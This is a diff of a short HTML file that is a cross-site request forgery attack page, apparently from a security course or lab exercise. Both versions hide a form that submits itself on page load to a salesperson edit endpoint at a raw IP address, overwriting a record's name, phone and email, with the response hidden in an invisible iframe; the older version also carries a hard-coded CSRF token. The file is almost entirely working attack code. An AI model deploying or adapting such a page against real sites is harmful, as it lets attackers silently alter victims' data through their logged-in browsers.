@@ -1,12 +1,14 @@
 <html>
-  <body onload="document.hiddenForm.submit()">
-    <form name="hiddenForm" style="display:none" action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=5" target="target" method="post">
-      <input type="hidden" name="csrf_token" value="5257660e09f0c11fdc98635ddb40cd21">
-      <input type="text" name="first_name" value="Bob" />
-      <input type="text" name="last_name" value="Marley" />
-      <input type="text" name="phone" value="876-420-8888" />
-      <input type="text" name="email" value="bmarley@salesperson.com" />
+  <head>
+    <title>Le Form</title>
+  </head>
+  <body onload="document.edit_salesperson.submit()">
+    <form action="https://146.148.50.237/red/public/staff/salespeople/edit.php?id=1" method="POST" name="edit_salesperson" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="Joe"><br>
+      <input type="text" name="last_name" value="Black"><br>
+      <input type="text" name="phone" value="666-666-6666"><br>
+      <input type="text" name="email" value="iluv@peanut.butter"><br>
     </form>
-    <iframe name="target" style="display:none" ></iframe>
+    <iframe name="hidden_results" style="display: none;"></iframe>
   </body>
 </html>
